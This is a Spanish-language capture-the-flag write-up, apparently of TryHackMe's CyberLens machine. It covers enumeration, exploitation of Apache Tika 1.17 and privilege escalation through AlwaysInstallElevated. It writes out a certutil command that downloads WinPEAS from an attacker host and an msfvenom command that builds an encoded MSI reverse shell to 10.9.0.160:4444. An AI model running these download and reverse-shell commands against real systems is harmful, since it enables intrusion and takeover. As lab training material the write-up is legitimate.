Realizamos un escaneo de nmap
![[Pasted image 20240605074030.png]]

Revisamos los puertos abiertos y encontramos dos puertos con el servicio http abiertos, vamos a analizarlos, si abrimos el navegador y escribimos la direccion de primeras aparece lo siguiente
![[Pasted image 20240605074518.png]]

Analizando un poco mas la web descubrimos que podemos subir archivos
![[Pasted image 20240605074548.png]]

Seguimos enumerando mas información
![[Pasted image 20240605074719.png]]

Realizando fuzzing web encontramos un ficheros .js el cual contiene el codigo para subir ficheros de la imagen vista previamente
![[Pasted image 20240605080636.png]]

Revisamos la url y nos encontramos con este servidor Apache Tika 1.17
![[Pasted image 20240605083217.png]]

Vamos a sacar mas información sobre esta url, primero capturamos la petición y encontramos la siguiente información
![[Pasted image 20240605081923.png]]

Por lo que vemos acepta los siguientes ficheros y la imagen anterior nos muestra donde envia los ficheros, la ruta es la siguiente `http://cyberlens.thm:61777/meta` revisamos que peticiones acepta
```Bash
curl -i -X OPTIONS http://cyberlens.thm:61777/meta
```
![[Pasted image 20240605082059.png]]

Una vez enumerada la información buscamos la version de Apache tika 1.17 y encontramos una vulnerabilidad
Revisamos y encontramos un exploit para esta version del servidor apache
![[Pasted image 20240605083405.png]]

Seleccionamos el exploit
![[Pasted image 20240605083537.png]]

Lo configuramos
![[Pasted image 20240605084540.png]]

Y al ejecutarlo obtenemos acceso a la maquina
![[Pasted image 20240605084615.png]]

Ahora vamos a realizar la enumeración local y a hacer una escalada de privilegios, arrancamos un servidor donde se encuentre el archivo WinPEAS.exe
![[Pasted image 20240522113717.png]]

Descargarnos el fichero
```Powershell
certutil -urlcache -f http://10.9.0.160:8080/winPEASany_ofs.exe C:\Users\CyberLens\Desktop\WinPEAS.exe
```
![[Pasted image 20240605094835.png]]

Ahora ejecutamos WinPEAS
![[Pasted image 20240605095025.png]]

Ahora tendremos que analizar la información y ver que vulnerabilidades a detectado
![[Pasted image 20240605100728.png]]
![[Pasted image 20240605100824.png]]


Enumeramos la información de los usuarios
![[Pasted image 20240605115244.png]]
![[Pasted image 20240605115515.png]]

Detectamos que esta habilitado la ejecución de archivos MSI en la maquina victima `Always Install Elevated`, asi que crearemos un ejecuable con msfvenom y lo ejecutaremos en la maquina victima
```Bash
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.9.0.160 LPORT=4444 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstalElevated.msi
```
![[Pasted image 20240605120644.png]]

Creamos un servidor de python para traspasar el fichero
![[Pasted image 20240605120741.png]]

Y lo descargamos
![[Pasted image 20240605120951.png]]

Ahora verificamos que esta el archivo
![[Pasted image 20240605121034.png]]

Ahora nos ponemos en escucha con netcat
![[Pasted image 20240605121100.png]]

Y ejecutamos el archivo msi
![[Pasted image 20240605121132.png]]

Al volver a nuestro termianl de netcat habremos obtenido una sesion como administrador
![[Pasted image 20240605121216.png]]

Ahora ya podriamos leer la flag de admin
![[Pasted image 20240605121436.png]]







